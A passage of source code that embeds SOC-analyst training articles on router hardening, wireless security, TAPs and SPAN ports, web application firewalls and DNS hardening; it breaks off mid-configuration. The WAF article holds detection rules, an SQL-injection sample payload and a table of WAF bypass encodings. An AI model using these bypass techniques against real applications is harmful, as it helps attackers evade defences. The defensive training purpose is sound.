### BGP Route Filtering

```text
! Prefix list to filter incoming routes
ip prefix-list INBOUND-FILTER seq 5 deny 0.0.0.0/0         ! Reject default route
ip prefix-list INBOUND-FILTER seq 10 deny 10.0.0.0/8 le 32  ! Reject RFC 1918
ip prefix-list INBOUND-FILTER seq 15 deny 172.16.0.0/12 le 32
ip prefix-list INBOUND-FILTER seq 20 deny 192.168.0.0/16 le 32
ip prefix-list INBOUND-FILTER seq 25 deny 224.0.0.0/4 le 32  ! Reject multicast
ip prefix-list INBOUND-FILTER seq 100 permit 0.0.0.0/0 le 24  ! Accept /24 and shorter

router bgp 65001
 neighbor 203.0.113.1 remote-as 65002
 neighbor 203.0.113.1 prefix-list INBOUND-FILTER in
 neighbor 203.0.113.1 password BGP_AUTH_KEY
```

## Router Hardening Checklist

| Category | Action | Command/Config |
|---|---|---|
| Authentication | Use SSH v2, disable Telnet | `ip ssh version 2`, `transport input ssh` |
| Authentication | Strong local passwords | `algorithm-type scrypt secret` |
| Authentication | Limit login attempts | `login block-for 120 attempts 3 within 60` |
| Services | Disable CDP on external interfaces | `no cdp enable` |
| Services | Disable unused services | `no ip http server`, `no ip source-route` |
| Services | Disable IP directed broadcast | `no ip directed-broadcast` |
| Logging | Enable syslog with timestamps | `logging host`, `service timestamps` |
| Logging | Log ACL denies | `deny ip any any log-input` |
| Anti-spoofing | Enable uRPF | `ip verify unicast source reachable-via rx` |
| Control Plane | Implement CoPP | Rate-limit control plane traffic |
| NTP | Authenticate NTP sources | `ntp authenticate`, `ntp trusted-key` |
| SNMP | Use SNMPv3 with encryption | `snmp-server group v3 priv` |

## Router Compromise Indicators for SOC Analysts

| Indicator | Investigation Steps |
|---|---|
| Unexpected configuration changes | Check AAA accounting logs, compare running vs startup config |
| New user accounts created | Review `show users` and AAA logs |
| Modified ACLs | Compare with change management records |
| Unusual routing table entries | Check for route injection or hijacking |
| CPU spikes on router | Could indicate cryptomining or DoS |
| Unauthorized SNMP community strings | Review SNMP configuration |
| Login failures from unexpected IPs | Check VTY access logs |
| Modified IOS image hash | Compare with known-good hash |

## Key Takeaways for SOC Analysts

- Router logs are critical for detecting reconnaissance and lateral movement
- ACL log entries with `log-input` provide MAC addresses for attribution
- Always check for router configuration changes during incident investigations
- Control plane attacks (routing protocol manipulation) can redirect traffic silently
- Anti-spoofing controls (uRPF, ingress filtering) prevent reflected amplification attacks
"""
    ))

    # -------------------------------------------------------------------------
    # Article 7: Wireless Access Points and Controllers
    # -------------------------------------------------------------------------
    articles.append((
        "Wireless Access Points and Controllers",
        ["infrastructure", "wireless", "wifi", "access-points", "wlc", "802.1x"],
        r"""# Wireless Access Points and Controllers

## Overview

Wireless networks expand the attack surface significantly. Rogue access points, evil twin
attacks, and wireless credential theft are common threats. SOC analysts must understand
wireless architecture, authentication methods, and monitoring capabilities to detect and
respond to wireless security incidents.

## Autonomous vs Lightweight Access Points

| Feature | Autonomous AP | Lightweight AP (LWAP) |
|---|---|---|
| Configuration | Individual (per-AP) | Centralized (via WLC) |
| Firmware | Full IOS image | Thin image, WLC provides config |
| VLAN Assignment | Local | WLC-managed |
| Roaming | Limited, AP-to-AP | Seamless, WLC-managed |
| Management | CLI/GUI per AP | Single WLC interface |
| Scalability | Poor (10s of APs) | Excellent (1000s of APs) |
| Security Policies | Per-AP | Consistent, centralized |
| Monitoring | Per-AP SNMP | Centralized WIDS/WIPS |
| Use Case | Small office, home | Enterprise deployments |

## Wireless LAN Controller Architecture

```text
                   +------------------+
                   |       WLC        |
                   | (Wireless LAN    |
                   |  Controller)     |
                   +--------+---------+
                            |
                   CAPWAP Tunnel (UDP 5246/5247)
                            |
              +-------------+-------------+
              |             |             |
         +----+----+  +----+----+  +----+----+
         | LWAP 1  |  | LWAP 2  |  | LWAP 3  |
         +---------+  +---------+  +---------+
              |             |             |
         [Floor 1]    [Floor 2]    [Floor 3]
```

### CAPWAP (Control and Provisioning of Wireless Access Points)

| Channel | Port | Purpose |
|---|---|---|
| Control | UDP 5246 | AP management, configuration, firmware |
| Data | UDP 5247 | Client data traffic (optional, can use local switching) |

### WLC Deployment Modes

| Mode | Description | Use Case |
|---|---|---|
| Local Mode | All traffic tunneled to WLC | Default, full central visibility |
| FlexConnect | Local switching at branch, central management | Branch offices |
| Monitor Mode | AP acts as dedicated sensor | WIDS/WIPS |
| Sniffer Mode | AP captures packets for analysis | Troubleshooting |

## Wireless Security Protocols

| Protocol | Encryption | Authentication | Status |
|---|---|---|---|
| WEP | RC4 (40/104-bit) | Open/Shared Key | Broken -- never use |
| WPA | TKIP (RC4-based) | PSK or 802.1X | Deprecated |
| WPA2-Personal | AES-CCMP | Pre-Shared Key (PSK) | Acceptable for home |
| WPA2-Enterprise | AES-CCMP | 802.1X (RADIUS) | Enterprise standard |
| WPA3-Personal | AES-CCMP/SAE | Simultaneous Auth of Equals | Recommended |
| WPA3-Enterprise | AES-256-GCMP | 802.1X with 192-bit security | Best available |

## 802.1X with RADIUS Authentication

```text
[Client]  <--EAP-->  [Access Point]  <--RADIUS-->  [RADIUS Server]
(Supplicant)          (Authenticator)                (Auth Server)
                                                         |
                                                    [AD/LDAP]
                                                    (Identity Store)
```

### 802.1X EAP Methods

| EAP Method | Certificate Required | Mutual Auth | Security Level |
|---|---|---|---|
| EAP-TLS | Client + Server cert | Yes | Highest |
| PEAP (MSCHAPv2) | Server cert only | Server only | High |
| EAP-TTLS | Server cert only | Server only | High |
| EAP-FAST | No (PAC-based) | Yes | Medium-High |
| LEAP | No | No | Low (deprecated) |

### RADIUS Configuration Example (FreeRADIUS)

```text
# /etc/freeradius/clients.conf
client wireless-controller {
    ipaddr = 10.0.99.10
    secret = RADIUS_SHARED_SECRET
    shortname = wlc01
}

# /etc/freeradius/sites-available/default
server default {
    listen {
        type = auth
        ipaddr = 10.0.99.20
        port = 1812
    }
    authorize {
        eap
        ldap
    }
    authenticate {
        eap
    }
}
```

## Rogue AP Detection

### Types of Rogue APs

| Type | Description | Risk Level |
|---|---|---|
| Unauthorized AP | Employee plugs in personal AP | High (bypasses controls) |
| Evil Twin | Attacker mimics legitimate SSID | Critical (credential theft) |
| Honeypot AP | Open AP to lure connections | Critical (MITM) |
| Compromised AP | Legitimate AP with modified firmware | Critical (persistent access) |

### WLC Rogue Detection Configuration

```text
! Enable rogue detection on WLC (Cisco example)
config rogue ap rogue-on-wire enable
config rogue ap timeout 1200
config rogue rule action alert
config rogue rule match type managed-ssid
config rogue adhoc enable alert

! Classification rules
config rogue rule add priority 1 classify malicious \
    match-type ssid match-value "Corporate-WiFi"
config rogue rule add priority 2 classify friendly \
    match-type mac match-value 00:11:22:*
```

### Rogue AP Detection Methods

| Method | Description |
|---|---|
| RF scanning | APs periodically scan all channels for unknown BSSIDs |
| Wired-side detection | Correlate rogue AP MAC with switch port MAC tables |
| Client reports | Managed clients report nearby APs to WLC |
| Dedicated sensors | APs in monitor mode do full-time scanning |
| NAC integration | Detect unauthorized DHCP/ARP from rogue APs |

## Wireless IDS/IPS (WIDS/WIPS)

### Common Wireless Attacks Detected

| Attack | Detection Method | WIPS Response |
|---|---|---|
| Deauthentication flood | Excessive deauth frames | Alert, contain |
| Evil twin | SSID match with unknown BSSID | Alert, contain |
| WPA handshake capture | Targeted deauth + probe | Alert |
| KARMA/MANA attack | Responding to all probe requests | Alert, contain |
| Client isolation bypass | Direct client-to-client frames | Alert |
| PMKID attack | Unusual EAPOL patterns | Alert |

### Containment Actions

```text
! WLC rogue containment (sends deauth frames to clients near rogue)
config rogue ap friendly mac-address DELETE aa:bb:cc:dd:ee:ff
config rogue ap classify malicious aa:bb:cc:dd:ee:ff
config rogue client alert aa:bb:cc:dd:ee:ff

! Auto-containment (use with caution -- legal implications)
config rogue ap auto-contain level 1 enable
```

**Warning:** Wireless containment (sending deauth frames against rogue APs) may have
legal implications depending on jurisdiction. Always consult legal counsel before
enabling auto-containment.

## Guest Network Architecture

```text
[Guest Client] --> [AP/SSID: Guest] --> [Guest VLAN 30]
                                             |
                                    [Captive Portal Server]
                                             |
                                    [Guest Firewall ACL]
                                             |
                                    [Internet Only]

Guest Network Isolation:
- Separate VLAN from corporate
- No access to internal resources
- Client isolation enabled (guests cannot see each other)
- Rate limiting per client
- Captive portal with acceptance of terms
- Time-limited access
- HTTPS interception for portal redirect
```

## Wireless Monitoring for SOC Analysts

### Key Wireless Log Sources

| Source | Information Provided |
|---|---|
| WLC auth logs | Client association, authentication success/failure |
| RADIUS logs | 802.1X authentication details, user identity |
| WIDS/WIPS alerts | Rogue APs, attacks, policy violations |
| Client event logs | Roaming events, signal quality, disconnects |
| RF environment | Channel utilization, interference, unusual activity |

### Suspicious Wireless Activity Indicators

| Indicator | Possible Attack |
|---|---|
| Many deauth frames from single source | Deauth attack (precursor to evil twin) |
| Unknown SSID matching corporate name | Evil twin AP |
| Client connecting to open AP after deauth | Credential capture via evil twin |
| New AP with strong signal appearing suddenly | Rogue AP deployment |
| Multiple failed 802.1X authentications | Credential brute force |
| Client probing for common SSIDs | Karma/MANA attack reconnaissance |

## Key Takeaways for SOC Analysts

- WPA2-Enterprise with 802.1X provides per-user authentication and accountability
- Rogue AP detection requires both RF scanning and wired-side correlation
- Guest networks must be fully isolated from corporate resources
- Wireless containment has legal implications -- document policies carefully
- Correlate wireless authentication logs with RADIUS and NAC for full visibility
"""
    ))

    # -------------------------------------------------------------------------
    # Article 8: Network TAPs SPAN Ports and Traffic Capture
    # -------------------------------------------------------------------------
    articles.append((
        "Network TAPs SPAN Ports and Traffic Capture",
        ["infrastructure", "network-tap", "span-port", "packet-capture", "monitoring"],
        r"""# Network TAPs, SPAN Ports, and Traffic Capture

## Overview

Security monitoring tools (IDS, packet capture, SIEM) need access to network traffic.
Two primary methods provide this: network TAPs (Test Access Points) and SPAN/mirror ports.
Understanding the differences, limitations, and proper deployment is essential for SOC
teams that rely on packet-level visibility.

## TAP vs SPAN Comparison

| Feature | Network TAP | SPAN/Mirror Port |
|---|---|---|
| Traffic Copy Method | Physical/optical inline split | Switch-based software copy |
| Packet Loss | None (passive) | Possible under load |
| Impact on Network | None (fail-open models available) | Uses switch CPU and backplane |
| Full Duplex Capture | Yes (dedicated TX/RX copies) | May aggregate or drop during congestion |
| Error Frames | Captured | Often dropped by switch |
| Deployment | Requires physical installation | Software configuration only |
| Cost | Higher (hardware purchase) | Lower (switch feature) |
| Scalability | One TAP per link | Multiple sessions, but limited |
| Physical Layer Visibility | Yes (can see Layer 1 errors) | No |
| Reliability | Very high | Depends on switch load |

## Network TAP Types

### Passive Copper TAP

```text
[Device A] ---- [TAP] ---- [Device B]
                  |
          +-------+-------+
          |               |
     [Monitor A]    [Monitor B]
     (A->B traffic) (B->A traffic)
```

### Passive Fiber TAP

```text
[Device A] ==fiber== [TAP] ==fiber== [Device B]
                       |
               +-------+-------+
               |               |
          [Monitor A]    [Monitor B]
          (TX from A)    (TX from B)

Splits light signal using optical splitter (e.g., 70/30 or 50/50)
No power required for basic fiber TAPs
```

### Aggregation TAP

Combines both directions into a single output stream:

```text
[Device A] ---- [Aggregation TAP] ---- [Device B]
                       |
                 [Single Monitor]
                 (Both directions)

Warning: Full-duplex link at 50%+ utilization will cause
packet loss on aggregated output port.
```

### TAP Types Summary

| TAP Type | Power Required | Fail Mode | Output Ports | Best For |
|---|---|---|---|---|
| Passive Copper | No | Fail-open | 2 (one per direction) | Critical links |
| Passive Fiber | No | Fail-open | 2 (one per direction) | Data center fiber |
| Active/Regeneration | Yes | Fail-open with bypass | 2+ (regenerated copies) | Multiple tools |
| Aggregation | Yes | Configurable | 1 (combined) | Single monitoring tool |
| Network Packet Broker | Yes | Configurable | Many | Large-scale monitoring |

## SPAN/Mirror Port Configuration

### Cisco IOS SPAN

```text
! Basic SPAN session - mirror port Gi0/1 to Gi0/24
monitor session 1 source interface GigabitEthernet0/1 both
monitor session 1 destination interface GigabitEthernet0/24

! Mirror entire VLAN
monitor session 2 source vlan 10,20 rx
monitor session 2 destination interface GigabitEthernet0/23

! Filter SPAN to specific VLAN on trunk
monitor session 3 source interface GigabitEthernet0/48
monitor session 3 filter vlan 10
monitor session 3 destination interface GigabitEthernet0/22

! Verify SPAN configuration
show monitor session all
```

### Remote SPAN (RSPAN)

```text
! Allows mirroring across switches using a dedicated RSPAN VLAN

! Source switch configuration
vlan 900
 name RSPAN-VLAN
 remote-span

monitor session 1 source interface GigabitEthernet0/1
monitor session 1 destination remote vlan 900

! Destination switch configuration
vlan 900
 name RSPAN-VLAN
 remote-span

monitor session 1 source remote vlan 900
monitor session 1 destination interface GigabitEthernet0/24
```

### Encapsulated Remote SPAN (ERSPAN)

```text
! Uses GRE encapsulation - works across routed networks

! Source router
monitor session 1 type erspan-source
 source interface GigabitEthernet0/1
 destination
  erspan-id 100
  ip address 10.0.99.50
  origin ip address 10.0.1.1

! Destination (monitoring server decapsulates GRE)
```

## SPAN Limitations and Gotchas

| Limitation | Impact | Mitigation |
|---|---|---|
| Switch CPU overhead | Performance impact on production switch | Use dedicated monitoring switch or TAP |
| Oversubscription | Packet loss when source > destination bandwidth | Limit source ports, use aggregation |
| SPAN port count | Typically 2-4 sessions per switch | Prioritize critical segments |
| No error frames | Corrupted packets not mirrored | Use TAP for complete visibility |
| CRC recalculation | Original CRC not preserved | TAP preserves original frames |
| One-way destination | SPAN destination cannot send traffic | Dedicated monitoring port |
| VLAN tag stripping | Some switches strip VLAN tags on SPAN | Check switch-specific behavior |

## Placement Strategy for Security Monitoring

```text
                     Internet
                        |
                   [Firewall]
                     |    |
              +------+    +------+
              |                  |
         [TAP #1]           [TAP #2]
         DMZ segment        WAN uplink
              |                  |
         [IDS Sensor]       [Packet Capture]
              |                  |
         [DMZ Switch]      [Core Switch]
              |            SPAN port |
         [DMZ Servers]          |
                          [SIEM Collector]
                               |
                    +----------+-----------+
                    |                      |
              [User Access]          [Server Access]
              Switch SPAN            Switch SPAN
                    |                      |
              [NDR Sensor]          [Packet Capture]
```

### Placement Decision Matrix

| Location | Method | Monitoring Tool | Captures |
|---|---|---|---|
| Internet edge (outside FW) | TAP | IDS | All inbound attacks |
| Internet edge (inside FW) | TAP | IDS, PCAP | Allowed traffic only |
| DMZ segment | TAP | IDS, PCAP | Server-facing traffic |
| Core switch | SPAN | NDR, SIEM | East-west traffic |
| Server VLAN | SPAN | PCAP, DLP | Database and app traffic |
| User access | SPAN | NDR | Endpoint communications |

## Packet Capture Best Practices

### Capture Sizing

| Environment | Daily Volume (est.) | Storage per Day |
|---|---|---|
| Small office (100 users) | 50-100 GB | 50-100 GB |
| Mid-size (1000 users) | 500 GB - 1 TB | 500 GB - 1 TB |
| Enterprise (10,000 users) | 5-10 TB | 5-10 TB |

### tcpdump Capture Examples

```bash
# Capture on specific interface, write to file
tcpdump -i eth0 -w /captures/traffic-$(date +%Y%m%d-%H%M).pcap

# Capture with rotation (100MB per file, keep 50 files)
tcpdump -i eth0 -w /captures/cap-%Y%m%d-%H%M%S.pcap \
    -G 3600 -C 100 -W 50

# Capture specific traffic (DNS)
tcpdump -i eth0 -w /captures/dns.pcap port 53

# Capture with BPF filter (specific host, no SSH noise)
tcpdump -i eth0 -w /captures/investigation.pcap \
    'host 10.0.1.50 and not port 22'

# Capture HTTP traffic with payload
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

### Network Packet Broker (NPB)

For large environments, an NPB aggregates, filters, and distributes traffic:

```text
Multiple TAPs/SPAN --> [Network Packet Broker] --> IDS Tool
                                |                --> PCAP Storage
                                |                --> DLP Engine
                                |                --> NDR Platform
                                |                --> Custom Analysis

NPB Features:
- Aggregation from multiple sources
- Traffic filtering (include/exclude by protocol, VLAN, IP)
- Load balancing across tool clusters
- Deduplication of packets seen on multiple TAPs
- SSL decryption and re-encryption
- Packet slicing (header-only mode to save storage)
```

## Capacity Planning

| Factor | Consideration |
|---|---|
| Link speed | TAP and monitor NIC must match or exceed link speed |
| Utilization | Links above 50% utilization need full-speed monitoring |
| Full duplex | 1 Gbps full duplex = 2 Gbps of traffic to monitor |
| Tool throughput | IDS/IPS must handle peak traffic without dropping packets |
| Storage | Full packet capture at 1 Gbps = ~10 TB per day |
| Retention | Compliance may require 30-90 days of packet data |

## Key Takeaways for SOC Analysts

- TAPs provide guaranteed, lossless packet capture -- prefer them for critical segments
- SPAN ports are convenient but can drop packets under load -- not suitable for forensic-grade capture
- Always verify your monitoring infrastructure captures what you think it captures
- Missing packets in captures during an investigation may indicate SPAN oversubscription
- Network packet brokers are essential for scaling monitoring in large environments
- Consider both north-south (perimeter) and east-west (lateral) visibility
"""
    ))

    # -------------------------------------------------------------------------
    # Article 9: Web Application Firewalls
    # -------------------------------------------------------------------------
    articles.append((
        "Web Application Firewalls",
        ["infrastructure", "waf", "web-security", "owasp", "application-security"],
        r"""# Web Application Firewalls (WAF)

## Overview

A Web Application Firewall inspects HTTP/HTTPS traffic to protect web applications from
attacks that network firewalls and IDS cannot detect. WAFs operate at Layer 7 and understand
HTTP semantics, enabling them to block SQL injection, cross-site scripting (XSS), and
other application-layer attacks. SOC analysts frequently triage WAF alerts and must
understand how WAFs detect threats, how to tune rules, and what evasion techniques
attackers use.

## What WAFs Protect Against

| Attack Category | Examples | WAF Detection Method |
|---|---|---|
| Injection | SQL injection, command injection, LDAP injection | Pattern matching, input validation |
| XSS | Reflected, stored, DOM-based XSS | Script tag detection, encoding analysis |
| Broken Authentication | Brute force, credential stuffing | Rate limiting, anomaly detection |
| SSRF | Internal resource access via web app | URL pattern analysis |
| File Inclusion | LFI, RFI | Path traversal pattern detection |
| Security Misconfig | Verbose errors, default credentials | Response inspection |
| XXE | XML External Entity injection | XML parser configuration |
| Deserialization | Insecure object deserialization | Payload pattern matching |
| API Abuse | Excessive calls, parameter tampering | Rate limiting, schema validation |

## WAF Deployment Modes

### Inline (Reverse Proxy)

```text
[Client] --> [WAF] --> [Web Server]

WAF terminates TLS, inspects request, forwards clean traffic.
Most common deployment for full protection.
```

### Out-of-Band (Detection Only)

```text
[Client] --> [Web Server]
                |
          [SPAN/TAP copy]
                |
             [WAF]
             (alert only, no blocking)
```

### Cloud-Based WAF

```text
[Client] --> [Cloud WAF / CDN] --> [Origin Server]

DNS points to cloud WAF IP. Cloud WAF proxies traffic.
Examples: Cloudflare, AWS WAF, Akamai, Azure Front Door
```

| Mode | Blocking | Latency | TLS Visibility | Deployment Effort |
|---|---|---|---|---|
| Inline Reverse Proxy | Yes | Added | Full (terminates TLS) | Moderate |
| Out-of-Band | No (alert only) | None | Requires TLS decryption | Low |
| Cloud WAF | Yes | Variable (CDN may help) | Full | Low |
| Embedded (Module) | Yes | Minimal | Full (runs in web server) | Low |

## OWASP Core Rule Set (CRS)

The OWASP CRS is the standard open-source rule set used with ModSecurity and other WAFs.

### CRS Paranoia Levels

| Level | Description | False Positive Rate | Use Case |
|---|---|---|---|
| PL1 | Basic rules, low FP | Low | Default, general purpose |
| PL2 | Additional rules | Moderate | Standard web apps |
| PL3 | Strict rules | Higher | Sensitive applications |
| PL4 | Maximum detection | Very High | Critical apps, requires extensive tuning |

### ModSecurity with CRS Configuration

```apache
# Apache ModSecurity configuration
<IfModule security2_module>
    # Enable ModSecurity
    SecRuleEngine On

    # Request body handling
    SecRequestBodyAccess On
    SecRequestBodyLimit 13107200
    SecRequestBodyNoFilesLimit 131072

    # Response body inspection
    SecResponseBodyAccess On
    SecResponseBodyMimeType text/plain text/html text/xml application/json

    # Audit logging
    SecAuditEngine RelevantOnly
    SecAuditLogRelevantStatus "^(?:5|4(?!04))"
    SecAuditLogType Serial
    SecAuditLog /var/log/modsec/audit.log

    # Include OWASP CRS
    Include /etc/modsecurity/crs/crs-setup.conf
    Include /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

### Example CRS Rules

```text
# SQL Injection Detection (simplified)
SecRule ARGS "@detectSQLi" \
    "id:942100, \
     phase:2, \
     block, \
     msg:'SQL Injection Attack Detected via libinjection', \
     logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}', \
     tag:'OWASP_CRS', \
     tag:'attack-sqli', \
     severity:'CRITICAL'"

# XSS Detection
SecRule ARGS "@detectXSS" \
    "id:941100, \
     phase:2, \
     block, \
     msg:'XSS Attack Detected via libinjection', \
     tag:'attack-xss', \
     severity:'CRITICAL'"

# Path Traversal Detection
SecRule ARGS "@rx (?:(?:^|[\\/])\.\.[\\/])" \
    "id:930100, \
     phase:2, \
     block, \
     msg:'Path Traversal Attack (/../)', \
     tag:'attack-lfi', \
     severity:'CRITICAL'"
```

## WAF Rule Tuning

### Common False Positive Scenarios

| Scenario | Why It Triggers | Tuning Approach |
|---|---|---|
| Rich text editor input | HTML tags trigger XSS rules | Exclude parameter from XSS rules |
| Search with SQL keywords | "SELECT" in search triggers SQLi | Adjust threshold or exclude field |
| File upload endpoints | Binary data triggers multiple rules | Exclude URI from body inspection |
| API with JSON payloads | Special characters in JSON values | Adjust content type handling |
| Legitimate URL with encoded chars | Double encoding detection | Whitelist specific URIs |

### Tuning Configuration Examples

```apache
# Exclude specific parameter from SQL injection checks
SecRuleUpdateTargetById 942100 "!ARGS:rich_text_content"

# Exclude specific URI from all CRS rules
SecRule REQUEST_URI "@beginsWith /api/webhook" \
    "id:1001, phase:1, pass, nolog, \
     ctl:ruleRemoveById=941100-941999, \
     ctl:ruleRemoveById=942100-942999"

# Increase anomaly threshold for specific IP (WAF testing)
SecRule REMOTE_ADDR "@ipMatch 10.0.5.100" \
    "id:1002, phase:1, pass, nolog, \
     ctl:ruleRemoveById=949110"
```

### Anomaly Scoring Mode

Modern WAFs use anomaly scoring instead of instant blocking:

```text
Request arrives:
  Rule 942100 matches -> +5 points (critical)
  Rule 941100 matches -> +5 points (critical)
  Rule 930100 does not match -> +0 points
  Total score: 10

Threshold: 5 (default CRS inbound)
Action: Block (score 10 >= threshold 5)

Tuning: Increase threshold to reduce false positives
  SecAction "id:900110, phase:1, pass, nolog, \
      setvar:tx.inbound_anomaly_score_threshold=10"
```

## WAF Bypass Techniques Defenders Should Know

| Technique | Example | Defense |
|---|---|---|
| Case variation | `SeLeCt` instead of `SELECT` | Case-insensitive matching |
| URL encoding | `%53%45%4C%45%43%54` | Decode before inspection |
| Double encoding | `%2553%2545%254C%2545%2543%2554` | Multi-pass decoding |
| Unicode encoding | `\u0053ELECT` | Unicode normalization |
| Comment injection | `SEL/**/ECT` | Comment removal |
| Null bytes | `SEL%00ECT` | Null byte handling |
| HTTP parameter pollution | `id=1&id=1 OR 1=1` | All parameter instances checked |
| Content-Type mismatch | JSON payload with form Content-Type | Strict Content-Type enforcement |
| Chunked transfer | Split payload across chunks | Reassemble before inspection |

## WAF Log Analysis for SOC Analysts

### Key WAF Log Fields

```json
{
  "timestamp": "2026-02-15T14:32:01Z",
  "client_ip": "198.51.100.9",
  "method": "POST",
  "uri": "/api/login",
  "status": 403,
  "rule_id": "942100",
  "rule_msg": "SQL Injection Attack Detected",
  "severity": "CRITICAL",
  "matched_data": "' OR 1=1 --",
  "matched_var": "ARGS:username",
  "anomaly_score": 25,
  "action": "blocked",
  "request_id": "abc123def456"
}
```

### Alert Triage Checklist

1. **Is it a true positive?** Check the matched data against the rule description
2. **What was targeted?** Which URI and parameter were attacked?
3. **Was it blocked or just logged?** Check the action field
4. **Is it part of a campaign?** Check for other alerts from the same source IP
5. **Was the attacker successful?** Check response codes (200 after attack = concern)
6. **What is the scope?** How many endpoints were targeted?
7. **Correlate externally:** Check the source IP in threat intelligence feeds

## Key Takeaways for SOC Analysts

- WAF alerts are among the highest-volume alerts; efficient triage is essential
- A WAF blocking an attack does NOT mean the application is safe -- the WAF may miss variants
- False positives in WAF logs do not mean the WAF is broken -- it means tuning is needed
- Always check if the attack payload reached the application (blocked vs logged)
- WAF bypass is a real threat; defense-in-depth (WAF + secure code + patching) is required
- Correlate WAF alerts with application logs for full attack chain visibility
"""
    ))

    # -------------------------------------------------------------------------
    # Article 10: DNS Server Types and Security Hardening
    # -------------------------------------------------------------------------
    articles.append((
        "DNS Server Types and Security Hardening",
        ["infrastructure", "dns", "dnssec", "dns-security", "doh", "dot"],
        r"""# DNS Server Types and Security Hardening

## Overview

DNS is a critical infrastructure service and a frequent attack vector. Attackers abuse DNS
for reconnaissance, command-and-control communication, data exfiltration, and redirection.
SOC analysts must understand DNS server types, security mechanisms, and how to detect
DNS-based threats.

## DNS Server Types

| Type | Function | Example |
|---|---|---|
| Authoritative | Holds zone records, answers queries for its domains | BIND, PowerDNS, Windows DNS |
| Recursive (Resolver) | Resolves queries on behalf of clients, caches results | Unbound, BIND (recursive), Windows DNS |
| Forwarding | Passes queries to upstream resolver, caches results | Internal DNS forwarder |
| Root | 13 root server clusters, top of DNS hierarchy | a.root-servers.net through m.root-servers.net |
| Caching-Only | Resolves and caches, not authoritative for any zone | Unbound, dnsmasq |

### DNS Resolution Flow

```text
[Client] --> [Recursive Resolver] --> [Root Server]
                    |                      |
                    |               [TLD Server (.com)]
                    |                      |
                    |            [Authoritative Server]
                    |                      |
                    |<--- Answer (IP) ------+
                    |
              [Cache result]
                    |
[Client] <-- Answer (IP)
```

## Authoritative DNS Hardening

### BIND Authoritative Configuration

```text
// /etc/named.conf - Authoritative server
options {
    directory "/var/named";
    listen-on port 53 { 10.0.1.53; };

    // Disable recursion on authoritative servers
    recursion no;
    additional-from-auth no;
    additional-from-cache no;

    // Hide version string
    version "not disclosed";

    // Restrict zone transfers to secondary DNS only
    allow-transfer { 10.0.1.54; };

    // Rate limit responses (mitigate amplification attacks)
    rate-limit {
        responses-per-second 10;
        window 5;
    };
};

zone "example.com" IN {
    type master;
    file "example.com.zone";
    allow-transfer { 10.0.1.54; };
    also-notify { 10.0.1.54; };

    // DNSSEC signing
    auto-dnssec maintain;
    inline-signing yes;
    key-directory "/var/named/keys";
};
```

## Recursive DNS Hardening

### Unbound Recursive Resolver Configuration

```yaml
# /etc/unbound/unbound.conf
server:
    interface: 10.0.1.53
    port: 53

    # Restrict to internal clients
    access-control: 10.0.0.0/8 allow
    access-control: 172.16.0.0/12 allow
    access-control: 192.168.0.0/16 allow
    access-control: 0.0.0.0/0 refuse

    # Hardening options
    hide-identity: yes
    hide-version: yes
    harden-glue: yes
    harden-dnssec-stripped: yes
    harden-referral-path: yes
    harden-algo-downgrade: yes

    # Use 0x20 encoding for additional cache poisoning protection
    use-caps-for-id: yes

    # Limit large UDP responses (mitigate amplification)
    edns-buffer-size: 1232

    # Cache settings
    cache-max-ttl: 86400
    cache-min-ttl: 300

    # Prefetch popular names before TTL expiry
    prefetch: yes

    # DNSSEC validation
    auto-trust-anchor-file: "/var/lib/unbound/root.key"

    # Block known malicious domains (RPZ alternative)
    local-zone: "malware-domain.com" refuse
    local-zone: "evil-c2.net" refuse
```

## DNSSEC (DNS Security Extensions)

DNSSEC adds cryptographic signatures to DNS records, enabling clients to verify
that responses have not been tampered with.

### DNSSEC Chain of Trust

```text
Root Zone (.)
  |-- Signs .com DS record
  |
  .com TLD
  |-- Signs example.com DS record
  |
  example.com
  |-- Signs its own A, MX, CNAME records with RRSIG
  |-- DNSKEY contains public key
  |-- DS (Delegation Signer) links to parent
```

### DNSSEC Record Types

| Record | Purpose |
|---|---|
| RRSIG | Signature over a DNS record set |
| DNSKEY | Public key for the zone |
| DS | Hash of child zone DNSKEY (in parent zone) |
| NSEC/NSEC3 | Authenticated denial of existence |

### Verifying DNSSEC

```bash
# Check if a domain has DNSSEC
dig +dnssec example.com A

# Verify DNSSEC chain
dig +trace +dnssec example.com A

# Check DS record at parent
dig DS example.com @a.gtld-servers.net

# Validate with drill
drill -DT example.com
```

## DNS over HTTPS (DoH) and DNS over TLS (DoT)

| Protocol | Port | Encryption | Detection Difficulty |
|---|---|---|---|
| Traditional DNS | UDP/TCP 53 | None (plaintext) | Easy |
| DNS over TLS (DoT) | TCP 853 | TLS | Moderate (known port) |
| DNS over HTTPS (DoH) | TCP 443 | TLS (within HTTPS) | Hard (blends with web) |

### Security Implications for SOC

```text
Traditional DNS:
  [Client] --UDP 53--> [DNS Server]
  SOC can inspect: Full query and response content
  Monitoring: DNS query logging, passive DNS

DNS over TLS:
  [Client] --TCP 853--> [DoT Resolver]
  SOC can inspect: Metadata (destination IP/port)
  Monitoring: Connection to known DoT resolvers

DNS over HTTPS:
  [Client] --TCP 443--> [DoH Resolver]
  SOC can inspect: Almost nothing (looks like HTTPS)
  Monitoring: Very difficult without TLS inspection
```

### Controlling DoH/DoT in Enterprise

```text
# Block external DoT at firewall
deny tcp any any eq 853

# Block known DoH providers at proxy/firewall
deny tcp any host 1.1.1.1 eq 443
deny tcp any host 8.8.8.8 eq 443
deny tcp any host 9.9.9.9 eq 443

# Force all DNS through corporate resolver
deny udp any any eq 53 (except corporate DNS)
deny tcp any any eq 53 (except corporate DNS)

# Use canary domain to disable browser DoH
# Browsers check for "use-application-dns.net"
# If it resolves to NXDOMAIN, browser disables DoH
```

## Response Rate Limiting (RRL)

Mitigates DNS amplification attacks by limiting identical responses:

```text
// BIND RRL configuration
rate-limit {
    responses-per-second 5;
    referrals-per-second 5;
    nodata-per-second 5;
    nxdomains-per-second 5;
    errors-per-second 5;
    all-per-second 20;
    window 15;
    slip 2;
    ipv4-prefix-length 24;
};
```

## Zone Transfer Security

Zone transfers (AXFR/IXFR) replicate DNS zone data between servers. Unrestricted
zone transfers expose the entire DNS inventory to attackers.

```text
# Restrict zone transfers
// BIND
zone "example.com" {
    allow-transfer { 10.0.1.54; key transfer-key; };
};

// TSIG key authentication
key "transfer-key" {
    algorithm hmac-sha256;
    secret "BASE64_SECRET_HERE";
};

server 10.0.1.54 {
    keys { transfer-key; };
